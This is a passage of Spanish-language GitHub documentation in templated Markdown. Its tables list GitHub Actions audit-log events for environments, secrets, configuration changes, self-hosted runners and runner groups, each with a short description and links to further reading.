Por ejemplo, puedes utilizar la bitácora de auditoría para rastrear el evento `org.update_actions_secret`, el cual rastrea los cambios en los secretos de la organización: ![Entradas de la bitácora de auditoría](/assets/images/help/repository/audit-log-entries.png)

Las siguientes tablas describen los eventos de {% data variables.product.prodname_actions %} que puedes encontrar en la bitácora de auditoría. Para obtener más información sobre cómo utilizar la bitácora de auditoría, consulta la sección "[Revisar la bitácora de auditoría para tu organización](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log)" y "[Revisar las bitácoras de auditoría para tu empresa](/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise)".

{% ifversion fpt or ghec %}
### Eventos para los ambientes

| Acción                              | Descripción                                                                                                                                                                                 |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `environment.create_actions_secret` | Se activa cuando se crea un secreto en un ambiente. Para obtener más información, consulta la sección ["Secretos de ambiente](/actions/reference/environments#environment-secrets)".        |
| `environment.delete`                | Se activa cuando se borra un ambiente. Para obtener más información, consulta la sección "[Borrar un ambiente](/actions/reference/environments#deleting-an-environment)".                   |
| `environment.remove_actions_secret` | Se activa cuando se elimina a un secreto de un ambiente. Para obtener más información, consulta la sección ["Secretos de ambiente](/actions/reference/environments#environment-secrets)".   |
| `environment.update_actions_secret` | Se activa cuando se actualiza a un secreto en un ambiente. Para obtener más información, consulta la sección ["Secretos de ambiente](/actions/reference/environments#environment-secrets)". |
{% endif %}

{% ifversion fpt or ghes or ghec %}
### Eventos para cambios de configuración
| Acción                                | Descripción                                                                                                                                                                                                                                                                                                                           |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `repo.actions_enabled`                | Se activa cuando {% data variables.product.prodname_actions %} se habilita en un repositorio. Puede visualizarse utilizando la IU. Este evento no es visible cuando accedes a la bitácora de auditoría utilizando la API de REST. Para obtener más información, consulta la sección "[Utilizar la API de REST](#using-the-rest-api)". |
| `repo.update_actions_access_settings` | Se activa cuando se cambia el ajuste para controlar cómo los flujos de trabajo de {% data variables.product.prodname_actions %} utilizan tu repositorio en otros repositorios.                                                                                                                                                        |
{% endif %}

### Eventos para la administración de secretos
| Acción                       | Descripción                                                                                                                                                                                                                                                                                           |
| ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `org.create_actions_secret`  | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se crea para una organización. Para obtener más información, consulta la sección "[Crear secretos cifrados para una organización](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization)". |
| `org.remove_actions_secret`  | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se elimina.                                                                                                                                                                                                              |
| `org.update_actions_secret`  | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se actualiza.                                                                                                                                                                                                            |
| `repo.create_actions_secret` | Se crea cuando un secreto de {% data variables.product.prodname_actions %} se crea para un repositorio. Para obtener más información, consulta la sección "[Crear secretos cifrados para un repositorio](/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-a-repository)".          |
| `repo.remove_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se elimina.                                                                                                                                                                                                              |
| `repo.update_actions_secret` | Se activa cuando un secreto de {% data variables.product.prodname_actions %} se actualiza.                                                                                                                                                                                                            |

### Eventos para ejecutores auto-hospedados
| Acción                                    | Descripción                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.register_self_hosted_runner`  | Se crea cuando se registra un ejecutor auto-hospedado nuevo. Para obtener más información, consulta la sección "[Agregar un ejecutor auto-hospedado a una empresa](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-enterprise)".                                                                                                                                                                                                                                                                                                                         |
| `enterprise.remove_self_hosted_runner`    | Se activa cuando se elimina un ejecutor auto-hospedado.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| `enterprise.runner_group_runners_updated` | Se activa cuando la lista de miembros de un grupo de ejecutores se actualiza. Para obtener más información, consulta la sección "[Configurar ejecutores auto-hospedados en un grupo para una organización](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".                                                                                                                                                                                                                                                                                                            |
| `enterprise.self_hosted_runner_online`    | Se activa cuando la aplicación del ejecutor se inicia. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para obtener más información, consulta "[Comprobar el estado de un ejecutor autoalojado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."                                                                                                                                                                                                              |
| `enterprise.self_hosted_runner_offline`   | Se activa cuando se detiene la aplicación del ejecutor. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para obtener más información, consulta "[Comprobar el estado de un ejecutor autoalojado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."                                                                                                                                                                                                             |
| `enterprise.self_hosted_runner_updated`   | Se activa cuando se actualiza la aplicación ejecutora. Puede visualizarse utilizando la API de REST y la IU. Este evento no se incluye cuando exportas la bitácora de auditoría como datos de JSON o como un archivo de CSV. Para obtener más información, consulta las secciones "[Acerca de los ejecutores auto-hospedados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)" y "[Revisar la bitácora de auditoría en tu organización](/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#exporting-the-audit-log)". |
| `org.register_self_hosted_runner`         | Se crea cuando se registra un ejecutor auto-hospedado nuevo. Para obtener más información, consulta la sección "[Agregar un ejecutor auto-hospedado a una organización](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-an-organization)".                                                                                                                                                                                                                                                                                                                  |
| `org.remove_self_hosted_runner`           | Se activa cuando se elimina un ejecutor auto-hospedado. Para obtener más información, consulta la sección [Eliminar a un ejecutor de una organización](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-an-organization).                                                                                                                                                                                                                                                                                                                                          |
| `org.runner_group_runners_updated`        | Se activa cuando se actualiza la lista de miembros de un grupo de ejecutores. Para obtener más información, consulta la sección "[Configurar ejecutores auto-hospedados en un grupo para una organización](/rest/reference/actions#set-self-hosted-runners-in-a-group-for-an-organization)".                                                                                                                                                                                                                                                                                                            |
| `org.runner_group_updated`                | Se activa cuando se cambia la configuración de un grupo de ejecutores auto-hospedados. Para obtener más información, consulta la sección "[Cambiar la política de acceso para un grupo de ejecutores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)".                                                                                                                                                                                                                                 |
| `org.self_hosted_runner_online`           | Se activa cuando la aplicación del ejecutor se inicia. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para obtener más información, consulta "[Comprobar el estado de un ejecutor autoalojado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."                                                                                                                                                                                                              |
| `org.self_hosted_runner_offline`          | Se activa cuando se detiene la aplicación del ejecutor. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para obtener más información, consulta "[Comprobar el estado de un ejecutor autoalojado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."                                                                                                                                                                                                             |
| `org.self_hosted_runner_updated`          | Se activa cuando se actualiza la aplicación ejecutora. Se puede ver utilizando la API de REST y la IU; no se puede ver en la exportación de JSON/CSV. Para obtener más información, consulta "[Acerca de los ejecutores autoalojados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."                                                                                                                                                                                                                                                                          |
| `repo.register_self_hosted_runner`        | Se crea cuando se registra un ejecutor auto-hospedado nuevo. Para obtener más información, consulta la sección "[Agregar un ejecutor auto-hospedado a un repositorio](/actions/hosting-your-own-runners/adding-self-hosted-runners#adding-a-self-hosted-runner-to-a-repository)".                                                                                                                                                                                                                                                                                                                       |
| `repo.remove_self_hosted_runner`          | Se activa cuando se elimina un ejecutor auto-hospedado. Para obtener más información, consulta la sección "[Eliminar a un ejecutor de un repositorio](/actions/hosting-your-own-runners/removing-self-hosted-runners#removing-a-runner-from-a-repository)".                                                                                                                                                                                                                                                                                                                                             |
| `repo.self_hosted_runner_online`          | Se activa cuando la aplicación del ejecutor se inicia. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para obtener más información, consulta "[Comprobar el estado de un ejecutor autoalojado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."                                                                                                                                                                                                              |
| `repo.self_hosted_runner_offline`         | Se activa cuando se detiene la aplicación del ejecutor. Solo se puede ver utilizando la API de REST; no está visible en la IU o en la exportación de JSON/CSV. Para obtener más información, consulta "[Comprobar el estado de un ejecutor autoalojado](/actions/hosting-your-own-runners/monitoring-and-troubleshooting-self-hosted-runners#checking-the-status-of-a-self-hosted-runner)."                                                                                                                                                                                                             |
| `repo.self_hosted_runner_updated`         | Se activa cuando se actualiza la aplicación ejecutora. Se puede ver utilizando la API de REST y la IU; no se puede ver en la exportación de JSON/CSV. Para obtener más información, consulta "[Acerca de los ejecutores autoalojados](/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners)."                                                                                                                                                                                                                                                                          |

### Eventos para grupos de ejecutores auto-hospedados
| Acción                                   | Descripción                                                                                                                                                                                                                                                                                                                                                             |
| ---------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enterprise.runner_group_created`        | Se activa cuando se crea un grupo de ejecutores auto-hospedados. Para obtener más información, consulta la sección "[Crear un grupo de ejecutores auto-hospedados para una empresa](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-enterprise)".                                      |
| `enterprise.runner_group_removed`        | Se activa cuando se elimina un grupo de ejecutores auto-hospedado. Para obtener más información, consulta la sección "[Eliminar un grupo de ejecutores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".                                                                    |
| `enterprise.runner_group_runner_removed` | Se activa cuando se utiliza la API de REST para eliminar un ejecutor auto-hospedado de un grupo.                                                                                                                                                                                                                                                                        |
| `enterprise.runner_group_runners_added`  | Se activa cuando se agrega un ejecutor auto-hospedado a un grupo. Para obtener más información, consulta la sección "[Mover un ejecutor auto-hospedado a un grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".                                                                      |
| `enterprise.runner_group_updated`        | Se activa cuando se cambia la configuración de un grupo de ejecutores auto-hospedados. Para obtener más información, consulta la sección "[Cambiar la política de acceso para un grupo de ejecutores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)". |
| `org.runner_group_created`               | Se activa cuando se crea un grupo de ejecutores auto-hospedados. Para obtener más información, consulta la sección "[Crear un grupo de ejecutores auto-hospedados para una organización](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#creating-a-self-hosted-runner-group-for-an-organization)".                               |
| `org.runner_group_removed`               | Se activa cuando se elimina un grupo de ejecutores auto-hospedado. Para obtener más información, consulta la sección "[Eliminar un grupo de ejecutores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#removing-a-self-hosted-runner-group)".                                                                    |
| `org.runner_group_updated`               | Se activa cuando se cambia la configuración de un grupo de ejecutores auto-hospedados. Para obtener más información, consulta la sección "[Cambiar la política de acceso para un grupo de ejecutores auto-hospedados](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#changing-the-access-policy-of-a-self-hosted-runner-group)". |
| `org.runner_group_runners_added`         | Se activa cuando se agrega un ejecutor auto-hospedado a un grupo. Para obtener más información, consulta la sección "[Mover un ejecutor auto-hospedado a un grupo](/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups#moving-a-self-hosted-runner-to-a-group)".                                                                      |
| `org.runner_group_runner_removed`        | Se activa cuando se utiliza la API de REST para eliminar un ejecutor auto-hospedado de un grupo. Para obtener más información, consulta la sección "[Eliminar un ejecutor auto-hospedado de un grupo en una organización](/rest/reference/actions#remove-a-self-hosted-runner-from-a-group-for-an-organization)".                                                       |

### Eventos para las actividades de los flujos de trabajo

{% data reusables.actions.actions-audit-events-workflow %}
